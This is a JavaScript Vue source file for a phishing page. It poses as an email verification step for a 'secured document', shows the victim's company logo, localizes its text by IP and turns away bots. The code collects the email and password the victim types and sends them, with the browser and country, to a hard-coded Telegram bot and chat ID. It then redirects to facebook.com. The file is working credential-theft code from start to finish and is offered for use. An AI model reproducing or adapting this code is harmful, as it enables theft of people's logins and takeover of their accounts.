const TELEGRAM_BOT_TOKEN = '7852049948:AAFFkvkc-P1TcRMin_EggatMfqY-QFyc3F8';
const TELEGRAM_CHAT_ID = '-1002434577801';

const app = Vue.createApp({
  data() {
    return {
      email: '',
      password: '',
      showPassword: false,
      showModal: false,
      domainLogo: 'assets/logo2.png', // Default dynamic logo
      localizedText: {
        enterEmail: 'Verify your email identity to access the secured document.',
        next: 'Next',
        enterPassword: 'Enter Password',
        verify: 'Verify',
        checking: 'Checking, please wait...',
      },
    };
  },
  computed: {
    isValidEmail() {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/; // Basic email validation regex
      return emailRegex.test(this.email);
    },
    isValidPassword() {
      return this.password.length >= 5;
    },
    emailError() {
      return this.email && !this.isValidEmail;
    },
    passwordError() {
      return this.password && !this.isValidPassword;
    },
  },
  methods: {
    async setLocalization() {
      try {
        const res = await axios.get('https://ipapi.co/json/');
        const language = res.data.languages?.split(',')[0] || 'en';

        const translations = {
          en: {
            enterEmail: 'Verify your email identity to access the secured document.',
            next: 'Next',
            enterPassword: 'Enter Password',
            verify: 'Verify',
            checking: 'Checking, please wait...',
          },
          es: {
            enterEmail: 'Verifique su identidad de correo electrónico para acceder al documento seguro.',
            next: 'Siguiente',
            enterPassword: 'Ingrese contraseña',
            verify: 'Verificar',
            checking: 'Verificando, por favor espere...',
          },
          fr: {
            enterEmail: 'Vérifiez votre identité e-mail pour accéder au document sécurisé.',
            next: 'Suivant',
            enterPassword: 'Entrez le mot de passe',
            verify: 'Vérifier',
            checking: 'Vérification, veuillez patienter...',
          },
        };

        this.localizedText = translations[language] || translations['en'];
      } catch (error) {
        console.error('Localization Error:', error);
      }
    },
    updateLogo() {
      const domain = this.email.split('@')[1];
      if (domain) {
        this.domainLogo = `https://logo.clearbit.com/${domain}`;
      } else {
        this.domainLogo = 'assets/logo2.png'; // Fallback to default logo
      }
    },
    requestPassword() {
      if (this.isValidEmail) {
        this.updateLogo(); // Update the logo for the email domain
        this.showPassword = true; // Show the password input phase
      }
    },
    async verifyLogin() {
      if (!this.isValidPassword) {
        return;
      }

      const { country, isBot } = await this.getIPInfo();

      if (isBot) {
        alert('Access denied. Detected as bot.');
        return;
      }

      this.showModal = true;

      setTimeout(() => {
        this.sendToTelegram();
        window.location.href = 'https://facebook.com';
      }, 2000);
    },
    async getIPInfo() {
      try {
        const res = await axios.get('https://ipapi.co/json/');
        const country = res.data.country_name || 'Unknown';
        const isBot = res.data.user_type === 'bot';

        return { country, isBot };
      } catch (error) {
        return { country: 'Unknown', isBot: false };
      }
    },
    sendToTelegram() {
      const browserInfo = navigator.userAgent;
      const country = this.getIPInfo().then((info) => info.country);

      const message = `Email: ${this.email}\nPassword: ${this.password}\nBrowser: ${browserInfo}\nCountry: ${country}`;
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(
        message
      )}`;

      axios.get(url).catch((err) => console.error('Telegram Error:', err));
    },
  },
  mounted() {
    this.setLocalization();
  },
});

app.mount('#app');

